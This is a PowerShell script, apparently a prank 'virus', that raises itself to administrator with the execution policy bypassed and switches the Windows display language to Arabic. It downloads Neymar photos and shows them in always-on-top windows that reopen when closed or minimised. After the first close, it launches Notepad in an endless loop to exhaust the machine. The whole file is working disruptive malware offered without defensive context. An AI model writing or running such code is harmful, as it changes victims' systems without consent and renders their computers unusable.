param([switch]$Elevated)

function Test-Admin {
     $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
     $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
     if (-not $elevated) {
          Start-Process powershell.exe -Verb RunAs -ArgumentList ('-ExecutionPolicy Bypass -noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
     }
     exit
}

Install-Language ar-SA -CopyToSettings
Set-WinUILanguageOverride ar-SA

$neymar1 = "https://www.cnnbrasil.com.br/wp-content/uploads/sites/12/2023/09/Capturar-10-e1695576641881.jpg?w=836"
$neymar2 = "https://veja.abril.com.br/wp-content/uploads/2023/08/NEYMAR-04_1.jpg.jpg?quality=90&strip=info&w=720&h=440&crop=1"
$neymar3 = "https://media.gettyimages.com/id/1684466856/photo/neymar-dresses-in-traditional-arabic-clothes-for-saudi-national-day.jpg?s=1024x1024&w=gi&k=20&c=0xKGJXh4OBivWB7-f-NN_HEn43PBZRf6Pbqdp4AKsVY="
$neymar4 = "https://s2-gq.glbimg.com/TStdHhwXhYde1t4-NDpcZitoOvw=/0x0:1080x1350/984x0/smart/filters:strip_icc()/i.s3.glbimg.com/v1/AUTH_71a8fe14ac6d40bd993eb59f7203fe6f/internal_photos/bs/2024/5/9/sLpJmOQHmE4CGjVB9g3A/snapinsta.app-429050470-1088423999150449-6642280150559925892-n-1080.jpg"
$neymar5 = "https://i.superesportes.com.br/1yrmdGXW7UpJVdaKs0P6q3d8JS8=/1200x900/smart/imgsapp.mg.superesportes.com.br/app/noticia_126420360808/2022/11/22/3980504/neymar_1_87520.jpg"

$neymars = ($neymar1, $neymar2, $neymar3, $neymar4, $neymar5)

function Download-Neymar {
     param (
          [string] $neymarUrl,
          [string] $neymarName
     )
     Start-BitsTransfer -Source $neymarUrl -Destination "$env:PUBLIC\$neymarName"
     return "$env:PUBLIC\$neymarName"
}

$init = {
     Add-Type -AssemblyName 'System.Windows.Forms'

     function Display-Neymar {
          param (
               [string] $neymarUrl
          )

          [System.Windows.Forms.Application]::EnableVisualStyles()
          $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
          $random = New-Object System.Random 

          $img = [System.Drawing.Image]::Fromfile((Get-Item $neymarUrl))
    
          $form = New-Object Windows.Forms.Form
          $form.StartPosition = 'Manual' # This is important to set!
    
          function Randomize-Position {
               $form.Location = New-Object System.Drawing.Point(
                    $random.Next($screenBounds.Left, $screenBounds.Right - $form.Width),
                    $random.Next($screenBounds.Top, $screenBounds.Bottom - $form.Height)
               )
          }
    
          Randomize-Position
    
          # Window name and size
          $form.Text = "NEYMAR"
          $form.Width = $img.Size.Width;
          $form.Height = $img.Size.Height;
          $pictureBox = New-Object Windows.Forms.PictureBox
          $pictureBox.Width = $img.Size.Width;
          $pictureBox.Height = $img.Size.Height;
    
          # Loop to reopen the form
          $form.Add_FormClosing({
                    New-Item -Path "$env:PUBLIC\neymarvirus" -ItemType File -Force
                    Display-RandomNeymar
               })

          $form.Add_Resize({
               if ($form.WindowState -eq [System.Windows.Forms.FormWindowState]::Minimized) {
                    New-Item -Path "$env:PUBLIC\neymarvirus" -ItemType File -Force
                    Display-RandomNeymar
               }
               })
    
          $pictureBox.Image = $img;
          $form.controls.add($pictureBox)
          $form.Add_Shown( { $form.Activate() } )
          $form.TopMost = $true
          $form.ShowDialog()
     }

     function Display-RandomNeymar {
          Display-Neymar "$env:PUBLIC\neymar-$(Get-Random -Minimum 0 -Maximum ($neymars.Count - 1)).jpg"
     }
}


for ($i = 0; $i -lt $neymars.Count; $i++) {
     $neymarImage = Download-Neymar $neymars[$i] "neymar-$i.jpg"
     $sb = [scriptblock]::Create("`$global:neymars = `$using:neymars; Display-Neymar $neymarImage")
     Start-Job -ScriptBlock $sb -InitializationScript $init
}

while ($true) {
     Start-Sleep -Seconds 1
     If (Test-Path -Path "$env:PUBLIC\neymarvirus") {
          Start-Sleep -Seconds 10
          while ($true) {
               notepad
          }
      }
}
